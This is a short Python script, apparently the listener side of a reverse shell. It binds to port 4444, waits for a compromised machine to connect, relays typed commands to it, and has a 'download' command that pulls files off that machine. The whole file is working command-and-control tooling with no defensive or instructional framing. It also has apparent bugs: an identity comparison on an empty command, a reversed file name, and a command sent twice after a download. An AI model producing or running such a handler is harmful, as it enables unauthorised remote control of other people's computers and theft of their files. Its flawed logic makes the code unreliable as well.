 

import socket
import colorama

colorama.init()

LHOST = "127.0.0.1"
LPORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print("Listening on port", LPORT)
client, addr = sock.accept()

while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break

    if command is b"":
        print("Please enter a command")
    else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Terminating connection", addr[0])
            break
        print(data)
client.close()
sock.close()
